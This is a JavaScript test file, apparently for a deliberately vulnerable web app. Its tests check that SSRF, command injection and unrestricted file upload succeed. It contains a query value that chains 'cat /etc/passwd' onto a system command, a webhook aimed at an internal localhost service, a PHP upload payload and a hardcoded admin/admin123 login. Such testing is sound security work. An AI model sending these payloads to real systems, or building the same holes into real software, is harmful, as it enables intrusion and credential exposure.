const request = require('supertest');
const app = require('../server');

describe('SSRF and RCE Vulnerabilities', () => {
  let adminToken;

  beforeAll(async () => {
    const adminRes = await request(app)
      .post('/api/auth/login')
      .send({
        username: 'admin',
        password: 'admin123'
      });
    adminToken = adminRes.body.token;
  });

  test('SSRF in Webhook Test', async () => {
    // Create webhook pointing to internal network
    const webhook = await request(app)
      .post('/api/webhooks')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Internal Service',
        url: 'http://localhost:8080/internal-api',
        events: ['test']
      });

    const res = await request(app)
      .post(`/api/webhooks/test/${webhook.body.id}`)
      .set('Authorization', `Bearer ${adminToken}`);
    expect(res.status).not.toBe(403);
  });

  test('Command Injection in System Info', async () => {
    const res = await request(app)
      .get('/api/admin/system-info')
      .set('Authorization', `Bearer ${adminToken}`)
      .query({
        command: 'uname -a; cat /etc/passwd'
      });
    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty('output');
  });

  test('File Upload without Type Validation', async () => {
    const res = await request(app)
      .post('/api/files/upload')
      .set('Authorization', `Bearer ${adminToken}`)
      .attach('file', Buffer.from('<?php echo "hack"; ?>'), {
        filename: 'test.php',
        contentType: 'application/x-php'
      });
    expect(res.status).toBe(201);
  });
});